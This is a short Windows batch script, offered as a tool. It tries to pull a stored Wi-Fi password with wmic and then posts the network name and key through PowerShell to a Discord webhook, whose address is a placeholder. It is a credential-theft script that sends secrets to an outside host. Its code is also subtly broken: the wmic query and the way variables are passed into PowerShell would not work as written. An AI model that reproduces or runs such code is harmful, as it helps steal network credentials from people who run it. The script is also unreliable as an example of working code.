@echo off
setlocal

for /f "tokens=2 delims=:" %%A in ('wmic wirelessnetworkprofile where name="Wireless Network Connection" get SecuritySettings_Enabled^,KeyMaterial /value') do (
    set "SSID=Wireless Network Connection"
    set "KeyMaterial=%%A"
)

set "DiscordWebhookURL=YOUR_DISCORD_WEBHOOK_URL"

powershell -Command "
    $payload = @{
        'content' = 'Wi-Fi SSID: $global:SSID
Wi-Fi Password: $global:KeyMaterial'
    }
    Invoke-RestMethod -Uri '$global:DiscordWebhookURL' -Method POST -Body $payload
"
